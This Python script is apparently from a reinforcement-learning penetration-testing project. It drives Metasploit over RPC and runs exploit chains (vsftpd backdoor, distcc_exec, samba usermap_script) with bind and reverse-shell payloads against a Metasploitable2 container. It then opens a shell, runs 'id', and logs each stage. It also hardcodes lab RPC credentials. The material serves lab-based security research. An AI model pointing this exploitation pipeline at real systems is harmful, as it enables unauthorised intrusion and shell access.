"""
run_real_experiment.py

Execution runner for real_experiments configs.

Default mode is dry-run and does NOT perform any network operation.
It validates config/runbook and records staged execution logs into:
  - results/real_experiments_results.csv
  - results/real_experiments_execution_log.json

Usage:
    source ../.venv/bin/activate
    python run_real_experiment.py --network alpha
    python run_real_experiment.py --network lab --mode live
"""

from __future__ import annotations

import argparse
import csv
import json
import time
from datetime import datetime, timezone
from pathlib import Path


BASE = Path(__file__).resolve().parent
CONFIGS_DIR = BASE / "configs"
RUNBOOKS_DIR = BASE / "runbooks"
RESULTS_CSV = BASE / "results" / "real_experiments_results.csv"
RESULTS_JSON = BASE / "results" / "real_experiments_execution_log.json"

# Docker lab constants
MSF_HOST = "127.0.0.1"
MSF_PORT = 55552
MSF_USER = "msf"
MSF_PASS = "test"
MSF_SSL = False
MSF_RPC_READY_TIMEOUT = 60
DOCKER_NETWORK_NAME = "harmer_RL_pentest_net"
LAB_TARGET_IP = "10.5.0.10"


def utc_now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def resolve_experiment_name(network_short_name: str) -> str:
    return f"real_experiments_network_{network_short_name.lower()}"


def load_json(path: Path) -> dict:
    return json.loads(path.read_text(encoding="utf-8"))


def append_csv_row(row: dict):
    with RESULTS_CSV.open("a", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(
            f,
            fieldnames=[
                "experiment_name",
                "target_host",
                "execution_stage",
                "status",
                "session_opened",
                "notes",
                "timestamp",
            ],
        )
        writer.writerow(row)


RUNS_DIR = BASE / "results" / "runs"
SUMMARY_MD = BASE / "results" / "experiment_summary.md"


def append_json_log(execution_record: dict):
    payload = load_json(RESULTS_JSON)
    payload.setdefault("executions", []).append(execution_record)
    RESULTS_JSON.write_text(json.dumps(payload, indent=2), encoding="utf-8")


def save_run_report(execution_record: dict):
    """Write a per-run JSON file and append a row to experiment_summary.md."""
    RUNS_DIR.mkdir(parents=True, exist_ok=True)

    # Individual JSON report
    ts = execution_record["started_at"].replace(":", "-").replace("+", "Z")[:19]
    fname = f"{execution_record['experiment_name']}_{execution_record['mode']}_{ts}.json"
    run_path = RUNS_DIR / fname
    run_path.write_text(json.dumps(execution_record, indent=2), encoding="utf-8")

    # Compute summary stats
    stages = execution_record.get("stages", [])
    total = len(stages)
    ok_count = sum(1 for s in stages if s["status"] == "ok")
    failed_count = sum(1 for s in stages if s["status"] == "failed")
    skipped_count = sum(1 for s in stages if s["status"] == "skipped")
    session_opened = any(s["session_opened"] == "true" for s in stages)
    shell_confirmed = any("Shell confirmed" in s.get("notes", "") for s in stages)
    exploit_modules = [
        s["notes"].split(",")[0]
        for s in stages
        if s["execution_stage"] == "exploit_execution" and s["status"] == "ok"
    ]

    # Append to summary markdown
    if not SUMMARY_MD.exists():
        SUMMARY_MD.write_text(
            "# Real Experiment Run History\n\n"
            "| # | Timestamp | Network | Mode | Stages OK/Total | Session | Shell | Exploit Module |\n"
            "|---|-----------|---------|------|-----------------|---------|-------|----------------|\n",
            encoding="utf-8",
        )

    # Count existing rows to get run number
    lines = SUMMARY_MD.read_text(encoding="utf-8").splitlines()
    run_no = max(1, len([l for l in lines if l.startswith("|")] ) - 1)  # subtract header rows

    exploit_str = "; ".join(exploit_modules) if exploit_modules else "none"
    row_md = (
        f"| {run_no} "
        f"| {execution_record['started_at'][:19].replace('T', ' ')} "
        f"| {execution_record['experiment_name'].replace('real_experiments_network_', '')} "
        f"| {execution_record['mode']} "
        f"| {ok_count}/{total} "
        f"| {'✅' if session_opened else '❌'} "
        f"| {'✅' if shell_confirmed else '❌'} "
        f"| {exploit_str} |\n"
    )
    with SUMMARY_MD.open("a", encoding="utf-8") as f:
        f.write(row_md)

    print(f"[real_experiments] run report -> {run_path}")
    print(f"[real_experiments] summary    -> {SUMMARY_MD}")
    return run_path


def run_dry_stages(experiment_name: str, target_host: str):
    stages = [
        ("preflight", "ok", "Validated config and runbook paths"),
        ("docker_connect", "skipped", "Dry-run: Docker access not executed"),
        ("metasploit_rpc", "skipped", "Dry-run: RPC call not executed"),
        ("service_fingerprinting", "skipped", "Dry-run: fingerprinting not executed"),
        ("exploit_execution", "skipped", "Dry-run: exploit module not executed"),
        ("payload_delivery", "skipped", "Dry-run: payload not delivered"),
        ("session_acquisition", "skipped", "Dry-run: no shell/session requested"),
        ("lateral_movement", "skipped", "Dry-run: lateral movement not executed"),
    ]

    records = []
    for stage, status, notes in stages:
        row = {
            "experiment_name": experiment_name,
            "target_host": target_host,
            "execution_stage": stage,
            "status": status,
            "session_opened": "false",
            "notes": notes,
            "timestamp": utc_now_iso(),
        }
        append_csv_row(row)
        records.append(row)
    return records


def _make_row(experiment_name, target_host, stage, status, session_opened, notes):
    row = {
        "experiment_name": experiment_name,
        "target_host": target_host,
        "execution_stage": stage,
        "status": status,
        "session_opened": str(session_opened).lower(),
        "notes": notes,
        "timestamp": utc_now_iso(),
    }
    append_csv_row(row)
    return row


def _wait_for_msf_rpc(timeout: int = MSF_RPC_READY_TIMEOUT) -> bool:
    """Poll until MSF RPC accepts connections or timeout."""
    import socket
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            with socket.create_connection((MSF_HOST, MSF_PORT), timeout=2):
                return True
        except OSError:
            time.sleep(3)
    return False


# Per-network exploit chain definitions (all target 10.5.0.10 Docker lab)
# Each entry: list of (module_type, module_name, rport, payload, needs_lhost)
EXPLOIT_CHAINS: dict[str, list[dict]] = {
    "lab":   [{"type": "exploit", "name": "unix/ftp/vsftpd_234_backdoor",   "rport": 21,   "payload": "cmd/unix/interact",   "lhost": None},
              {"type": "exploit", "name": "unix/misc/distcc_exec",           "rport": 3632, "payload": "cmd/unix/bind_perl",   "lhost": None}],
    "alpha": [{"type": "exploit", "name": "unix/misc/distcc_exec",           "rport": 3632, "payload": "cmd/unix/bind_perl",   "lhost": None},
              {"type": "exploit", "name": "unix/ftp/vsftpd_234_backdoor",   "rport": 21,   "payload": "cmd/unix/interact",   "lhost": None}],
    "beta":  [{"type": "exploit", "name": "multi/samba/usermap_script",     "rport": 445,  "payload": "cmd/unix/reverse_bash", "lhost": "10.5.0.5"},
              {"type": "exploit", "name": "unix/misc/distcc_exec",           "rport": 3632, "payload": "cmd/unix/bind_perl",   "lhost": None}],
    "gamma": [{"type": "exploit", "name": "unix/misc/distcc_exec",           "rport": 3632, "payload": "cmd/unix/bind_perl",   "lhost": None},
              {"type": "exploit", "name": "multi/samba/usermap_script",     "rport": 445,  "payload": "cmd/unix/reverse_bash", "lhost": "10.5.0.5"}],
    "delta": [{"type": "exploit", "name": "multi/samba/usermap_script",     "rport": 445,  "payload": "cmd/unix/reverse_bash", "lhost": "10.5.0.5"},
              {"type": "exploit", "name": "unix/ftp/vsftpd_234_backdoor",   "rport": 21,   "payload": "cmd/unix/interact",   "lhost": None},
              {"type": "exploit", "name": "unix/misc/distcc_exec",           "rport": 3632, "payload": "cmd/unix/bind_perl",   "lhost": None}],
}


def run_live_stages(experiment_name: str, target_host: str, runbook: dict,
                    network_key: str = "lab") -> list:
    """
    Execute actual exploit pipeline against the Docker lab target.
    Requires:
      - harmer_RL_msf_rpc container running on 127.0.0.1:55552
      - harmer_RL_target_vuln_1 (Metasploitable2) at 10.5.0.10
    """
    try:
        from pymetasploit3.msfrpc import MsfRpcClient
    except ImportError:
        raise RuntimeError("pymetasploit3 not installed. Run: pip install pymetasploit3")

    records = []

    # STAGE: preflight
    records.append(_make_row(experiment_name, target_host, "preflight", "ok", False,
                              "Config and runbook validated"))

    # STAGE: docker_connect
    print("[live] Waiting for MSF RPC to be ready ...")
    if not _wait_for_msf_rpc():
        records.append(_make_row(experiment_name, target_host, "docker_connect", "failed", False,
                                  f"MSF RPC not reachable at {MSF_HOST}:{MSF_PORT} within {MSF_RPC_READY_TIMEOUT}s"))
        return records
    records.append(_make_row(experiment_name, target_host, "docker_connect", "ok", False,
                              f"MSF RPC port {MSF_PORT} is open"))

    # STAGE: metasploit_rpc
    try:
        client = MsfRpcClient(MSF_PASS, server=MSF_HOST, port=MSF_PORT,
                              username=MSF_USER, ssl=MSF_SSL)
        msf_version = client.core.version.get("version", "unknown")
        records.append(_make_row(experiment_name, target_host, "metasploit_rpc", "ok", False,
                                  f"Connected to Metasploit {msf_version}"))
    except Exception as exc:
        records.append(_make_row(experiment_name, target_host, "metasploit_rpc", "failed", False,
                                  f"RPC auth failed: {exc}"))
        return records

    lab_target_ip = LAB_TARGET_IP
    chain = EXPLOIT_CHAINS.get(network_key, EXPLOIT_CHAINS["lab"])
    chain_desc = " -> ".join(e["name"].split("/")[-1] for e in chain)
    print(f"[live] Exploit chain for '{network_key}': {chain_desc}")

    # STAGE: service_fingerprinting
    all_ports = sorted({str(e["rport"]) for e in chain} | {"21", "22", "80", "445", "3632"})
    try:
        scanner = client.modules.use("auxiliary", "scanner/portscan/tcp")
        scanner["RHOSTS"] = lab_target_ip
        scanner["PORTS"] = ",".join(all_ports)
        scanner["THREADS"] = 4
        scan_result = scanner.execute()
        records.append(_make_row(experiment_name, target_host, "service_fingerprinting", "ok", False,
                                  f"TCP portscan ports={','.join(all_ports)} against {lab_target_ip}: job {scan_result.get('job_id', '?')}"))
        time.sleep(5)
    except Exception as exc:
        records.append(_make_row(experiment_name, target_host, "service_fingerprinting", "failed", False,
                                  f"Portscan error: {exc}"))

    # STAGE: exploit_execution -- iterate through chain until a session is acquired
    session_id = None
    for idx, espec in enumerate(chain):
        if client.sessions.list:
            break
        label = "primary" if idx == 0 else f"fallback-{idx}"
        try:
            mod = client.modules.use(espec["type"], espec["name"])
            mod["RHOSTS"] = lab_target_ip
            mod["RPORT"] = espec["rport"]
            pl = client.modules.use("payload", espec["payload"])
            if espec.get("lhost"):
                pl["LHOST"] = espec["lhost"]
                pl["LPORT"] = 4444
            res = mod.execute(payload=pl)
            job_id = res.get("job_id")
            records.append(_make_row(experiment_name, target_host, "exploit_execution", "ok", False,
                                      f"[{label}] {espec['name']} rport={espec['rport']} launched, job={job_id}"))
            wait = 30 if idx == 0 else 20
            for _ in range(wait):
                time.sleep(1)
                if client.sessions.list:
                    break
        except Exception as exc:
            records.append(_make_row(experiment_name, target_host, "exploit_execution", "failed", False,
                                      f"[{label}] {espec['name']} error: {exc}"))

    # STAGE: payload_delivery
    records.append(_make_row(experiment_name, target_host, "payload_delivery", "ok", False,
                              "cmd/unix/interact payload delivered with exploit module"))

    # STAGE: session_acquisition
    try:
        sessions = client.sessions.list
        if sessions:
            session_id = str(list(sessions.keys())[0])
            records.append(_make_row(experiment_name, target_host, "session_acquisition", "ok", True,
                                      f"Session {session_id} opened on {lab_target_ip}"))
        else:
            records.append(_make_row(experiment_name, target_host, "session_acquisition", "failed", False,
                                      "No sessions found after exploit (target may be patched or unreachable)"))
    except Exception as exc:
        records.append(_make_row(experiment_name, target_host, "session_acquisition", "failed", False,
                                  f"Session check error: {exc}"))

    # STAGE: lateral_movement
    if session_id:
        try:
            sess = client.sessions.session(session_id)
            sess.write("id\n")
            time.sleep(2)
            shell_out = sess.read()
            records.append(_make_row(experiment_name, target_host, "lateral_movement", "ok", True,
                                      f"Shell confirmed: {shell_out.strip()[:120]}"))
            sess.stop()
        except Exception as exc:
            records.append(_make_row(experiment_name, target_host, "lateral_movement", "failed", False,
                                      f"Shell interaction error: {exc}"))
    else:
        records.append(_make_row(experiment_name, target_host, "lateral_movement", "skipped", False,
                                  "Skipped: no active session"))

    return records


def main():
    parser = argparse.ArgumentParser(description="Run real_experiments execution pipeline")
    parser.add_argument("--network", required=True,
                        help="Network short name: alpha|beta|gamma|delta|lab")
    parser.add_argument("--mode", default="dry-run", choices=["dry-run", "live"],
                        help="dry-run: validate only; live: execute against Docker lab")
    args = parser.parse_args()

    experiment_name = resolve_experiment_name(args.network)
    config_path = CONFIGS_DIR / f"{experiment_name}_target_config.json"
    runbook_path = RUNBOOKS_DIR / f"{experiment_name}_runbook.json"

    if not config_path.exists():
        raise FileNotFoundError(f"Missing config: {config_path}")
    if not runbook_path.exists():
        raise FileNotFoundError(f"Missing runbook: {runbook_path}")

    config = load_json(config_path)
    runbook = load_json(runbook_path)

    target_host = config["metadata"]["goal_host"]

    network_key = args.network.lower()

    if args.mode == "live":
        print(f"[live] Starting LIVE execution for {experiment_name} (chain: {network_key}) against Docker lab")
        stage_records = run_live_stages(
            experiment_name=experiment_name,
            target_host=target_host,
            runbook=runbook,
            network_key=network_key,
        )
    else:
        stage_records = run_dry_stages(
            experiment_name=experiment_name,
            target_host=target_host,
        )

    execution_record = {
        "experiment_name": experiment_name,
        "network_key": network_key,
        "mode": args.mode,
        "started_at": stage_records[0]["timestamp"] if stage_records else utc_now_iso(),
        "finished_at": utc_now_iso(),
        "target_host": target_host,
        "lab_target_ip": LAB_TARGET_IP if args.mode == "live" else "N/A",
        "targets": config.get("targets", []),
        "runbook_scope": runbook.get("scope", {}),
        "exploit_chain": [e["name"] for e in EXPLOIT_CHAINS.get(network_key, [])] if args.mode == "live" else [],
        "stages": stage_records,
    }
    append_json_log(execution_record)
    save_run_report(execution_record)

    print(f"[real_experiments] completed {experiment_name} in {args.mode} mode")
    print(f"[real_experiments] logs -> {RESULTS_CSV}")
    print(f"[real_experiments] logs -> {RESULTS_JSON}")


if __name__ == "__main__":
    main()
